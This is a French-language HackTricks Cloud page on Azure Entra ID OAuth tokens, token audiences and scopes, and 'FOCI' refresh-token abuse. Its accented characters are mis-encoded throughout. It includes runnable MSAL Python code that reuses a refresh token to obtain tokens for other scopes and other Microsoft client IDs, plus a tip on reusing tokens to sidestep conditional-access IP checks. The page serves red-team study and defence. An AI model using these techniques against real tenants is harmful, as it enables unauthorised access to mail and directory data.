# Az - Tokens & Public Applications

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Entra ID est la plateforme de gestion des identit√©s et des acc√®s (IAM) bas√©e sur le cloud de Microsoft, servant de syst√®me d'authentification et d'autorisation fondamental pour des services comme Microsoft 365 et Azure Resource Manager. Azure AD impl√©mente le cadre d'autorisation OAuth 2.0 et le protocole d'authentification OpenID Connect (OIDC) pour g√©rer l'acc√®s aux ressources.

### OAuth

**Participants cl√©s dans OAuth 2.0 :**

1. **Serveur de ressources (RS) :** Prot√®ge les ressources appartenant au propri√©taire des ressources.
2. **Propri√©taire des ressources (RO) :** Typiquement un utilisateur final qui poss√®de les ressources prot√©g√©es.
3. **Application cliente (CA) :** Une application cherchant √† acc√©der aux ressources au nom du propri√©taire des ressources.
4. **Serveur d'autorisation (AS) :** D√©livre des jetons d'acc√®s aux applications clientes apr√®s les avoir authentifi√©es et autoris√©es.

**Scopes et consentement :**

* **Scopes :** Permissions granulaires d√©finies sur le serveur de ressources qui sp√©cifient les niveaux d'acc√®s.
* **Consentement :** Le processus par lequel un propri√©taire de ressources accorde √† une application cliente la permission d'acc√©der aux ressources avec des scopes sp√©cifiques.

**Int√©gration Microsoft 365 :**

* Microsoft 365 utilise Azure AD pour l'IAM et est compos√© de plusieurs applications OAuth "de premi√®re partie".
* Ces applications sont profond√©ment int√©gr√©es et ont souvent des relations de service interd√©pendantes.
* Pour simplifier l'exp√©rience utilisateur et maintenir la fonctionnalit√©, Microsoft accorde un "consentement implicite" ou un "pr√©-consentement" √† ces applications de premi√®re partie.
* **Consentement implicite :** Certaines applications se voient automatiquement **accorder l'acc√®s √† des scopes sp√©cifiques sans approbation explicite de l'utilisateur ou de l'administrateur**.
* Ces scopes pr√©-consentis sont g√©n√©ralement cach√©s √† la fois des utilisateurs et des administrateurs, les rendant moins visibles dans les interfaces de gestion standard.

**Types d'applications clientes :**

1. **Clients confidentiels :**
* Poss√®dent leurs propres identifiants (par exemple, mots de passe ou certificats).
* Peuvent **s'authentifier de mani√®re s√©curis√©e** aupr√®s du serveur d'autorisation.
2. **Clients publics :**
* N'ont pas d'identifiants uniques.
* Ne peuvent pas s'authentifier de mani√®re s√©curis√©e aupr√®s du serveur d'autorisation.
* **Implication de s√©curit√© :** Un attaquant peut usurper une application cliente publique lors de la demande de jetons, car il n'existe aucun m√©canisme pour que le serveur d'autorisation v√©rifie la l√©gitimit√© de l'application.

## Authentication Tokens

Il existe **trois types de jetons** utilis√©s dans OIDC :

* [**Jetons d'acc√®s**](https://learn.microsoft.com/en-us/azure/active-directory/develop/access-tokens)**:** Le client pr√©sente ce jeton au serveur de ressources pour **acc√©der aux ressources**. Il ne peut √™tre utilis√© que pour une combinaison sp√©cifique d'utilisateur, de client et de ressource et **ne peut pas √™tre r√©voqu√©** jusqu'√† son expiration - c'est-√†-dire 1 heure par d√©faut.
* **Jetons d'identit√© :** Le client re√ßoit ce **jeton du serveur d'autorisation**. Il contient des informations de base sur l'utilisateur. Il est **li√© √† une combinaison sp√©cifique d'utilisateur et de client**.
* **Jetons de rafra√Æchissement :** Fournis au client avec le jeton d'acc√®s. Utilis√©s pour **obtenir de nouveaux jetons d'acc√®s et d'identit√©**. Il est li√© √† une combinaison sp√©cifique d'utilisateur et de client et peut √™tre r√©voqu√©. L'expiration par d√©faut est de **90 jours** pour les jetons de rafra√Æchissement inactifs et **pas d'expiration pour les jetons actifs** (il est possible d'obtenir de nouveaux jetons de rafra√Æchissement √† partir d'un jeton de rafra√Æchissement).
* Un jeton de rafra√Æchissement doit √™tre li√© √† un **`aud`**, √† certains **scopes**, et √† un **tenant** et il ne devrait pouvoir g√©n√©rer des jetons d'acc√®s que pour cet aud, ces scopes (et pas plus) et ce tenant. Cependant, ce n'est pas le cas avec les **jetons d'applications FOCI**.
* Un jeton de rafra√Æchissement est crypt√© et seul Microsoft peut le d√©chiffrer.
* Obtenir un nouveau jeton de rafra√Æchissement ne r√©voque pas le jeton de rafra√Æchissement pr√©c√©dent.

{% hint style="warning" %}
Les informations pour **l'acc√®s conditionnel** sont **stock√©es** √† l'int√©rieur du **JWT**. Donc, si vous demandez le **jeton depuis une adresse IP autoris√©e**, cette **IP** sera **stock√©e** dans le jeton et vous pourrez utiliser ce jeton depuis une **adresse IP non autoris√©e pour acc√©der aux ressources**.
{% endhint %}

### Access Tokens "aud"

Le champ indiqu√© dans le champ "aud" est le **serveur de ressources** (l'application) utilis√© pour effectuer la connexion.

La commande `az account get-access-token --resource-type [...]` prend en charge les types suivants et chacun d'eux ajoutera un "aud" sp√©cifique dans le jeton d'acc√®s r√©sultant :

{% hint style="danger" %}
Notez que les √©l√©ments suivants ne sont que les API prises en charge par `az account get-access-token`, mais il y en a d'autres.
{% endhint %}

<details>

<summary>exemples d'aud</summary>

* **aad-graph (Azure Active Directory Graph API)** : Utilis√© pour acc√©der √† l'API Azure AD Graph h√©rit√©e (d√©pr√©ci√©e), qui permet aux applications de lire et d'√©crire des donn√©es d'annuaire dans Azure Active Directory (Azure AD).
* `https://graph.windows.net/`

- **arm (Azure Resource Manager)** : Utilis√© pour g√©rer les ressources Azure via l'API Azure Resource Manager. Cela inclut des op√©rations telles que la cr√©ation, la mise √† jour et la suppression de ressources telles que des machines virtuelles, des comptes de stockage, et plus encore.
* `https://management.core.windows.net/ ou https://management.azure.com/`

* **batch (Azure Batch Services)** : Utilis√© pour acc√©der √† Azure Batch, un service qui permet d'ex√©cuter efficacement des applications de calcul parall√®le √† grande √©chelle et de haute performance dans le cloud.
* `https://batch.core.windows.net/`

- **data-lake (Azure Data Lake Storage)** : Utilis√© pour interagir avec Azure Data Lake Storage Gen1, qui est un service de stockage et d'analyse de donn√©es √©volutif.
* `https://datalake.azure.net/`

* **media (Azure Media Services)** : Utilis√© pour acc√©der √† Azure Media Services, qui fournissent des services de traitement et de livraison de m√©dias bas√©s sur le cloud pour le contenu vid√©o et audio.
* `https://rest.media.azure.net`

- **ms-graph (Microsoft Graph API)** : Utilis√© pour acc√©der √† l'API Microsoft Graph, le point de terminaison unifi√© pour les donn√©es des services Microsoft 365. Il permet d'acc√©der aux donn√©es et aux informations des services tels qu'Azure AD, Office 365, Enterprise Mobility et les services de s√©curit√©.
* `https://graph.microsoft.com`

* **oss-rdbms (Azure Open Source Relational Databases)** : Utilis√© pour acc√©der aux services de base de donn√©es Azure pour des moteurs de bases de donn√©es relationnelles open-source comme MySQL, PostgreSQL et MariaDB.
* `https://ossrdbms-aad.database.windows.net`

</details>

### Access Tokens Scopes "scp"

Le scope d'un jeton d'acc√®s est stock√© √† l'int√©rieur de la cl√© scp dans le JWT du jeton d'acc√®s. Ces scopes d√©finissent √† quoi le jeton d'acc√®s a acc√®s.

Si un JWT est autoris√© √† contacter une API sp√©cifique mais **n'a pas le scope** pour effectuer l'action demand√©e, il **ne pourra pas effectuer l'action** avec ce JWT.

### Get refresh & access token example
```python
# Code example from https://github.com/secureworks/family-of-client-ids-research
import msal
import requests
import jwt
from pprint import pprint
from typing import Any, Dict, List


# LOGIN VIA CODE FLOW AUTHENTICATION
azure_cli_client = msal.PublicClientApplication(
"04b07795-8ddb-461a-bbee-02f9e1bf7b46" # ID for Azure CLI client
)
device_flow = azure_cli_client.initiate_device_flow(
scopes=["https://graph.microsoft.com/.default"]
)
print(device_flow["message"])

# Perform device code flow authentication

azure_cli_bearer_tokens_for_graph_api = azure_cli_client.acquire_token_by_device_flow(
device_flow
)
pprint(azure_cli_bearer_tokens_for_graph_api)



# DECODE JWT
def decode_jwt(base64_blob: str) -> Dict[str, Any]:
"""Decodes base64 encoded JWT blob"""
return jwt.decode(
base64_blob, options={"verify_signature": False, "verify_aud": False}
)
decoded_access_token = decode_jwt(
azure_cli_bearer_tokens_for_graph_api.get("access_token")
)
pprint(decoded_access_token)


# GET NEW ACCESS TOKEN AND REFRESH TOKEN
new_azure_cli_bearer_tokens_for_graph_api = (
# Same client as original authorization
azure_cli_client.acquire_token_by_refresh_token(
azure_cli_bearer_tokens_for_graph_api.get("refresh_token"),
# Same scopes as original authorization
scopes=["https://graph.microsoft.com/.default"],
)
)
pprint(new_azure_cli_bearer_tokens_for_graph_api)
```
## Escalade de privil√®ges des jetons FOCI

Il a √©t√© mentionn√© pr√©c√©demment que les jetons d'actualisation doivent √™tre li√©s aux **port√©es** avec lesquelles ils ont √©t√© g√©n√©r√©s, √† l'**application** et au **locataire** pour lesquels ils ont √©t√© g√©n√©r√©s. Si l'une de ces limites est franchie, il est possible d'escalader les privil√®ges car il sera possible de g√©n√©rer des jetons d'acc√®s pour d'autres ressources et locataires auxquels l'utilisateur a acc√®s et avec plus de port√©es que ce qui √©tait initialement pr√©vu.

De plus, **cela est possible avec tous les jetons d'actualisation** dans la [plateforme d'identit√© Microsoft](https://learn.microsoft.com/en-us/entra/identity-platform/) (comptes Microsoft Entra, comptes personnels Microsoft et comptes sociaux comme Facebook et Google) car comme le mentionnent les [**docs**](https://learn.microsoft.com/en-us/entra/identity-platform/refresh-tokens) : "Les jetons d'actualisation sont li√©s √† une combinaison d'utilisateur et de client, mais **ne sont pas li√©s √† une ressource ou √† un locataire**. Un client peut utiliser un jeton d'actualisation pour acqu√©rir des jetons d'acc√®s **√† travers n'importe quelle combinaison de ressource et de locataire** o√π il a la permission de le faire. Les jetons d'actualisation sont crypt√©s et seule la plateforme d'identit√© Microsoft peut les lire."

De plus, notez que les applications FOCI sont des applications publiques, donc **aucun secret n'est n√©cessaire** pour s'authentifier aupr√®s du serveur.

Ensuite, les clients FOCI connus rapport√©s dans la [**recherche originale**](https://github.com/secureworks/family-of-client-ids-research/tree/main) peuvent √™tre [**trouv√©s ici**](https://github.com/secureworks/family-of-client-ids-research/blob/main/known-foci-clients.csv).

### Obtenir une port√©e diff√©rente

En suivant l'exemple de code pr√©c√©dent, dans ce code, un nouveau jeton est demand√© pour une port√©e diff√©rente :
```python
# Code from https://github.com/secureworks/family-of-client-ids-research
azure_cli_bearer_tokens_for_outlook_api = (
# Same client as original authorization
azure_cli_client.acquire_token_by_refresh_token(
new_azure_cli_bearer_tokens_for_graph_api.get(
"refresh_token"
),
# But different scopes than original authorization
scopes=[
"https://outlook.office.com/.default"
],
)
)
pprint(azure_cli_bearer_tokens_for_outlook_api)
```
### Obtenir diff√©rents clients et port√©es
```python
# Code from https://github.com/secureworks/family-of-client-ids-research
microsoft_office_client = msal.PublicClientApplication("d3590ed6-52b3-4102-aeff-aad2292ab01c")
microsoft_office_bearer_tokens_for_graph_api = (
# This is a different client application than we used in the previous examples
microsoft_office_client.acquire_token_by_refresh_token(
# But we can use the refresh token issued to our original client application
azure_cli_bearer_tokens_for_outlook_api.get("refresh_token"),
# And request different scopes too
scopes=["https://graph.microsoft.com/.default"],
)
)
# How is this possible?
pprint(microsoft_office_bearer_tokens_for_graph_api)
```
## R√©f√©rences

* [https://github.com/secureworks/family-of-client-ids-research](https://github.com/secureworks/family-of-client-ids-research)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Formation Expert Red Team AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Formation Expert Red Team GCP (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PR au** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
